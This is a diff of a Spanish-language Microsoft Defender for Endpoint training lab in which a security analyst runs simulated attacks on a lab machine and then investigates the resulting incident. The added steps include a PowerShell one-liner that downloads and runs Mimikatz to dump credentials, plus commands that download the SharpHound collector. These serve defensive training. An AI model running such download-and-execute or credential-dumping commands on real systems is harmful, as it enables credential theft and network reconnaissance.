@@ -14,7 +14,6 @@ Usted es un analista de operaciones de seguridad que trabaja en una empresa que 
 
 Para explorar las funcionalidades de mitigación de ataques de Defender para puntos de conexión, ejecutarás dos ataques simulados.
 
-
 >**Nota:** Hay disponible una **[simulación de laboratorio interactiva](https://mslabs.cloudguides.com/guides/SC-200%20Lab%20Simulation%20-%20Mitigate%20attacks%20with%20Microsoft%20Defender%20for%20Endpoint)** que le permite realizar sus propias selecciones a su entera discreción. Es posible que encuentre pequeñas diferencias entre la simulación interactiva y el laboratorio hospedado, pero las ideas y los conceptos básicos que se muestran son los mismos. 
 
 
@@ -22,7 +21,7 @@ Para explorar las funcionalidades de mitigación de ataques de Defender para pun
 
 En esta tarea, confirmarás que el dispositivo se ha incorporado correctamente y crearás una alerta de prueba.
 
-1. Si todavía no estás en el portal de Microsoft 365 Defender en el explorador Microsoft Edge, ve a (https://security.microsoft.com) e inicia sesión como administrador para el inquilino.
+1. Si aún no está en el portal de Microsoft Defender XDR en el explorador Microsoft Edge, vaya a (https://security.microsoft.com) e inicie sesión como Administrador del inquilino.
 
 1. En el menú de la izquierda, en el área **Recursos**, selecciona **Dispositivos**. Espere hasta que WIN1 aparezca en la página Dispositivos antes de continuar. De lo contrario, es posible que tengas que repetir esta tarea para ver las alertas que se generarán más adelante.
 
@@ -38,35 +37,72 @@ En esta tarea, confirmarás que el dispositivo se ha incorporado correctamente y
 
 1. Cuando se muestre la ventana "Control de cuentas de usuario", selecciona **Sí** para permitir que se ejecute la aplicación. 
 
-1. Pega el script haciendo clic con el botón derecho en las ventanas **Administrador: símbolo del sistema** y presiona **Entrar** para ejecutarlo. **Nota:** la ventana se cierra automáticamente después de ejecutar el script.
+1. Pega el script haciendo clic con el botón derecho en las ventanas **Administrador: símbolo del sistema** y presiona **Entrar** para ejecutarlo.
 
+    >**Nota:** la ventana se cierra automáticamente después de ejecutar el script.
 
 ### Tarea 2: ataques simulados
 
-En esta tarea, ejecutarás dos ataques simulados para explorar las funcionalidades de Microsoft Defender para puntos de conexión.
+En esta tarea, ejecutará dos ataques *simulados* mediante *PowerShell* en *WIN1* para explorar las funcionalidades de Microsoft Defender para punto de conexión.
 
-1. En el menú izquierdo, en **Puntos de conexión**, selecciona **Evaluación y tutoriales** y después, selecciona **Tutoriales y simulaciones** en el lado izquierdo.
+`Attack 1: Mimikatz - Credential Dumping`
 
-1. Selecciona la pestaña **Tutoriales**.
+1. En la máquina *WIN1*, escriba **Comando** en la barra de búsqueda y seleccione **Ejecutar como administrador**.
 
-1. En *Investigación automatizada (puerta trasera)* verás un mensaje que describe el escenario. Debajo de este párrafo, haz clic en **Leer el tutorial**. Se abre una nueva pestaña del explorador que incluye instrucciones para realizar la simulación.
+1. Copie y pegue el siguiente comando en el **Administrador: Ventana del símbolo del sistema** y presione **Entrar** para ejecutarlo.
 
-1. En la nueva pestaña del explorador, busca la sección denominada **Ejecutar la simulación** (página 5, a partir del paso 2) y siga los pasos para ejecutar el ataque. **Sugerencia:** el archivo de simulación *RS4_WinATP-Intro-Invoice.docm* se puede encontrar en el portal, justo debajo de **Leer el tutorial** que has seleccionado en el paso anterior, seleccionando el botón **Obtener archivo de simulación**. 
+    ```CommandPrompt
+    powershell.exe "IEX (New-Object Net.WebClient).DownloadString('#{mimurl}'); Invoke-Mimikatz -DumpCreds"
+    ```
 
-<!--- 1. Repeat the last 3 steps to run another tutorial, *Automated investigation (fileless attack)*. This is no longer working due to win1 AV --->
+1. Debería ver un mensaje indicando *Acceso denegado* y un mensaje emergente de `Microsoft Defender Antivirus, Windows Security Virus and threats protection` mostrando *Amenazas encontradas*.
 
+1. Salga del **Administrador: Ventana del símbolo del sistema** escribiendo **salir** y presionando **Entrar**.
+
+`Attack 2: Bloodhound - Collection`
+
+1. En la máquina *WIN1*, escriba **PowerShell** en la barra de búsqueda, seleccione **Windows PowerShell** y seleccione **Ejecutar como administrador**.
+
+1. Copie y pegue los siguientes comandos en el **Administrador: Ventana del símbolo del sistema** y presione **Entrar** para ejecutarlo.
+
+    ```PowerShell
+    New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
+    Invoke-WebRequest "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/804503962b6dc554ad7d324cfa7f2b4a566a14e2/Ingestors/SharpHound.ps1" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
+    ```
+
+    >**Nota:** Se recomienda copiar, pegar y ejecutar los comandos de uno en uno. Abra *Bloc de notas* y copie los comandos en un archivo temporal para hacerlo. El primer comando crea una carpeta denominada *ExternalPayloads* en la misma carpeta donde se encuentra la carpeta *Atomic Red Team*. El segundo comando descarga el archivo *SharpHound.ps1* del repositorio de GitHub *BloodHound* y lo guarda en la carpeta *ExternalPayloads*.
+
+1. Debería ver un mensaje emergente en `Windows Security Virus and threats protection` el que se muestran las *Amenazas encontradas*.
+
+1. Copie y pegue el siguiente comando en el **Administrador: Ventana del símbolo del sistema** y presione **Entrar** para ejecutarlo.
+
+    ```PowerShell
+    Test-Path "PathToAtomicsFolder\..\ExternalPayloads\SharpHound.ps1"
+    ```
+
+1. Si la salida fuera *True*, el archivo de carga de malware no se habrá quitado por el Antivirus de Microsoft Defender. Si la salida fuera *False*, el archivo de carga de malware se habrá quitado por el Antivirus de Microsoft Defender. Use la tecla de dirección hacia arriba para repetir el comando hasta que la salida sea *False*.
+
+<!---1. From the left menu, under **Endpoints**, select **Evaluation & tutorials** and then select **Tutorials & simulations** from the left side.
+
+1. Select the **Tutorials** tab.
+
+1. Under *Automated investigation (backdoor)* you will see a message describing the scenario. Below this paragraph, click **Read the walkthrough**. A new browser tab opens which includes instructions to perform the simulation.
+
+1. In the new browser tab, locate the section named **Run the simulation** (page 5, starting at step 2) and follow the steps to run the attack. **Hint:** The simulation file *RS4_WinATP-Intro-Invoice.docm* can be found back in portal, just below the **Read the walkthrough** you selected in the previous step by selecting the **Get simulation file** button. 
+
+1. Repeat the last 3 steps to run another tutorial, *Automated investigation (fileless attack)*. This is no longer working due to win1 AV --->
 
 ### Tarea 3: investigar los ataques
 
-1. En el portal de Microsoft 365 Defender, selecciona **Incidentes y alertas** en la barra de menús de la izquierda y luego selecciona **Incidentes**.
+1. En el portal de Microsoft Defender XDR, seleccione **incidentes y alertas** en la barra de menús de la izquierda y, a continuación, seleccione **Incidentes**.
 
-1. Un nuevo incidente denominado "Incidente de varias etapas..." está en el panel derecho. Selecciona el nombre del incidente para cargar sus detalles.
+1. Hay un nuevo incidente denominado "Varias familias de amenazas detectadas en un punto de conexión" en el panel derecho. Selecciona el nombre del incidente para cargar sus detalles.
 
-    >**Nota:** un incidente llamado "Sospechoso..." puede aparecer primero. Esto se reemplazará más adelante por el incidente mencionado anteriormente cuando Microsoft 365 Defender los correlaciona con un único problema de seguridad, incluida la alerta de prueba original creada en la tarea 1.
+    >**Nota:** Debería ver las alertas *Bloodhound* y Mimikatz* en el panel **Alertas**. En **Activos/dispositivos**, el equipo *win1* ahora tendrá un **nivel de riesgo** con valor *Alto*.
 
 1. Selecciona el botón **Administrar incidente** y aparecerá una nueva hoja de ventana. 
 
-1. En **Etiquetas de incidente**, escribe "Tutorial" y selecciona **Tutorial (Crear nuevo)** para crear una nueva etiqueta. 
+1. En **Etiquetas de incidente**, escriba "Simulación" y seleccione **Simulación (Crear nueva)** para crear una nueva etiqueta. 
 
 1. Selecciona el botón de alternancia **Asignar a** y agrega tu cuenta de usuario (Me) como propietario del incidente. 
 
@@ -78,6 +114,6 @@ En esta tarea, ejecutarás dos ataques simulados para explorar las funcionalidad
 
 1. Revisa el contenido de las pestañas *Ataque, Alertas, Activos, Investigaciones, Evidencia y Respuesta* y *Resumen*. Los dispositivos y los usuarios se encuentran en la pestaña *Recursos*. La pestaña *Historia de ataque* muestra el *Gráfico de incidentes*. **Sugerencia**: es posible que algunas pestañas estén ocultas debido al tamaño de la pantalla. Selecciona la pestaña de puntos suspensivos (...) para que aparezcan.
 
->**Advertencia:** las simulaciones y tutoriales aquí son una excelente fuente de aprendizaje a través de la práctica.  Las simulaciones y tutoriales se agregan y editan periódicamente en el portal.  Pero algunas de estas simulaciones y tutoriales pueden interferir con el rendimiento de los laboratorios diseñados para este curso de formación.  Realiza solo las simulaciones y los tutoriales recomendados en las instrucciones que se ofrecen para este laboratorio al usar el inquilino de Azure proporcionado por el curso.  Puedes realizar las otras simulaciones y tutoriales *después* de completar este curso de formación con este inquilino.
+    >**Advertencia:** Los ataques aquí simulados son una excelente forma de aprendizaje mediante práctica. Realice solo los ataques de las instrucciones proporcionadas de este laboratorio cuando use el inquilino de Azure proporcionado por el curso.  Podrá realizar otros ataques simulados *después* de que este curso de entrenamiento se complete con este inquilino.
 
 ## Has completado el laboratorio.
